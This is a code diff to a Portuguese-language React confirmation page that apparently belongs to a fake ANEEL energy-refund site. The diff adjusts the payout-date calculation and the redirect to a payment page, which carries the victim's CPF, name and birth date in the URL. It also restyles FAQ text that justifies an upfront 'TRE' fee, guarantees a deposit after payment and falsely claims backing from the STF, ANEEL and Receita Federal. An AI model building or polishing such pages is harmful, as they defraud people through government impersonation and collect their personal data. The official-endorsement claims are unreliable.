@@ -58,20 +58,12 @@ export default function ConfirmacaoRestituicao() {
     buscarRestituicao();
   }, []);
 
-  // Função para calcular a data de previsão - 72h úteis (3 dias úteis)
+  // Função para calcular a data de previsão - exatamente 72 horas (3 dias) a partir da data/hora atual
   const calcularDataPrevisao = () => {
     const hoje = new Date();
-    const dataFutura = new Date(hoje);
     
-    // Adicionar 3 dias úteis (excluindo sábados e domingos)
-    let diasUteisAdicionados = 0;
-    while (diasUteisAdicionados < 3) {
-      dataFutura.setDate(dataFutura.getDate() + 1);
-      // 0 = domingo, 6 = sábado
-      if (dataFutura.getDay() !== 0 && dataFutura.getDay() !== 6) {
-        diasUteisAdicionados++;
-      }
-    }
+    // Adicionar exatamente 72 horas (3 dias)
+    const dataFutura = new Date(hoje.getTime() + (72 * 60 * 60 * 1000));
     
     const dia = dataFutura.getDate().toString().padStart(2, '0');
     const mes = (dataFutura.getMonth() + 1).toString().padStart(2, '0');
@@ -127,7 +119,14 @@ export default function ConfirmacaoRestituicao() {
   };
 
   const prosseguirParaPagamento = () => {
-    window.location.href = `/pagamento?cpf=${encodeURIComponent(cpf)}&nome=${encodeURIComponent(nome)}&valor=${encodeURIComponent(valorRestituicao)}&nasc=${encodeURIComponent(dataNascimento)}&companhia=${encodeURIComponent(companhia)}&estado=${encodeURIComponent(estado)}`;
+    // Criar URL com parâmetros
+    const url = `/pagamento?cpf=${encodeURIComponent(cpf)}&nome=${encodeURIComponent(nome)}&valor=${encodeURIComponent(valorRestituicao)}&nasc=${encodeURIComponent(dataNascimento)}&companhia=${encodeURIComponent(companhia)}&estado=${encodeURIComponent(estado)}`;
+    
+    // Usar history.pushState para transição mais rápida (sem recarregar a página inteira)
+    window.history.pushState({}, "", url);
+    
+    // Redirecionar manualmente para garantir a navegação
+    window.location.href = url;
   };
 
   return (
@@ -173,17 +172,20 @@ export default function ConfirmacaoRestituicao() {
                     Informações Importantes sobre a Restituição da ANEEL
                   </h3>
                   <div className="space-y-5">
-                    <div className="info-box pl-4 py-1">
-                      <h4 className="text-lg font-semibold text-[#2c5985]">Por que estou pagando uma taxa se o valor é meu por direito?</h4>
-                      <p className="text-gray-700 mb-2">A TRE é uma exigência operacional imposta pelos órgãos públicos para garantir a segurança da liberação, evitando fraudes, duplicidades e erros de restituição.</p>
+                    <div className="info-box pl-4 py-3 relative border border-gray-100 rounded-md shadow-sm">
+                      <div className="absolute left-0 top-0 bottom-0 w-1 bg-[#044785]"></div>
+                      <h4 className="text-lg font-semibold text-[#2c5985] pl-3">Por que estou pagando uma taxa se o valor é meu por direito?</h4>
+                      <p className="text-gray-700 mb-2 pl-3">A TRE é uma exigência operacional imposta pelos órgãos públicos para garantir a segurança da liberação, evitando fraudes, duplicidades e erros de restituição.</p>
                     </div>
-                    <div className="info-box pl-4 py-1">
-                      <h4 className="text-lg font-semibold text-[#2c5985]">A restituição é garantida após o pagamento da TRE?</h4>
-                      <p className="text-gray-700 mb-2">Sim. Após a confirmação, o valor de {formatarMoeda(valorRestituicao)} será depositado em até 72 horas úteis, conforme calendário de restituição oficial.</p>
+                    <div className="info-box pl-4 py-3 relative border border-gray-100 rounded-md shadow-sm">
+                      <div className="absolute left-0 top-0 bottom-0 w-1 bg-[#044785]"></div>
+                      <h4 className="text-lg font-semibold text-[#2c5985] pl-3">A restituição é garantida após o pagamento da TRE?</h4>
+                      <p className="text-gray-700 mb-2 pl-3">Sim. Após a confirmação, o valor de {formatarMoeda(valorRestituicao)} será depositado em até 72 horas úteis, conforme calendário de restituição oficial.</p>
                     </div>
-                    <div className="info-box pl-4 py-1">
-                      <h4 className="text-lg font-semibold text-[#2c5985]">Como sei que isso é oficial?</h4>
-                      <p className="text-gray-700 mb-2">Todo o processo está amparado por decisão do STF, regulamentado pela Lei Complementar nº 194/2022, e validado pela ANEEL e Receita Federal.</p>
+                    <div className="info-box pl-4 py-3 relative border border-gray-100 rounded-md shadow-sm">
+                      <div className="absolute left-0 top-0 bottom-0 w-1 bg-[#044785]"></div>
+                      <h4 className="text-lg font-semibold text-[#2c5985] pl-3">Como sei que isso é oficial?</h4>
+                      <p className="text-gray-700 mb-2 pl-3">Todo o processo está amparado por decisão do STF, regulamentado pela Lei Complementar nº 194/2022, e validado pela ANEEL e Receita Federal.</p>
                     </div>
                   </div>
                   <div className="bg-red-50 p-4 rounded-md border border-red-300 text-red-800 mt-6">
